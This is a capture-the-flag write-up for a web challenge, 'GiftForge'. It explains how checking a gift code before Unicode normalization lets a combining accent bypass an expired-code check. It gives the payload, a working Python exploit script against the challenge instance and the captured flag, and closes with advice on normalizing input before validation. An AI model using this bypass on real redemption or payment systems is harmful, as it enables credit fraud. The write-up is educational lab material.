# GiftForge Write-up

## Challenge Info

- **Name:** GiftForge  
- **Category:** Web  
- **Difficulty:** Very Easy  
- **Instance:** http://82.29.170.47:24176  
- **Flag format:** VBD{...}  

---

## Description

The application provides a redeem system for gift codes. One special code (`GIFT500`) is marked as expired, but due to improper input handling, it can still be abused.

---

## Root Cause

In the `/redeem` endpoint, the input is checked twice:

1. First check:
```python
if code == "GIFT500":
```

2. Then the input is normalized:
```python
code = "".join(c for c in unicodedata.normalize('NFKD', code) if not unicodedata.combining(c)).upper()
```

3. Second check:
```python
if code == "GIFT500":
```

### The issue

- The first comparison is done **before normalization**
- The second comparison is done **after normalization**

This allows us to send a visually similar string that bypasses the first check but becomes valid after normalization.

---

## Exploitation Idea

Use a Unicode combining character:

```text
GI\u0301FT500
```

- Raw value ≠ `GIFT500` → bypass expired check  
- Normalized value = `GIFT500` → grants 500 credits  

---

## Exploitation Steps

1. Create a new account  
2. Go to `/redeem`  
3. Submit the payload:
   ```
   GÍFT500
   ```
4. Balance increases to `$1500`  
5. Buy item `/buy/4` (The Secret Flag)  
6. Visit `/profile` and retrieve the flag  

---

## Exploit Script

```python
import requests
import re
import random
import string

BASE = "http://82.29.170.47:24176"
session = requests.Session()

def rand_str(n=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

user = "user_" + rand_str()
pwd = "Pass123!"

print("[*] Target:", BASE)
print("[*] Creating account:", user)

# register
session.post(f"{BASE}/signup", data={"username": user, "password": pwd})

# redeem bypass
payload = "GI\u0301FT500"
session.post(f"{BASE}/redeem", data={"code": payload})
print("[+] Redeemed bypass code")

# buy flag item
session.post(f"{BASE}/buy/4")
print("[+] Purchased flag item")

# fetch profile
resp = session.get(f"{BASE}/profile").text

flag = re.search(r"VBD\{.*?\}", resp)
if flag:
    print("\n[FLAG]", flag.group(0))
else:
    print("[!] Flag not found")
```

---

## Flag

```
VBD{n0rmalization_1s_3asy_1337_a660d3909fa8bb7015edf779ebefb9d0}
```

---

Thanks for reading and happy hacking! 🚩


- Always normalize input **before validation**  
- Security checks should not be duplicated inconsistently  
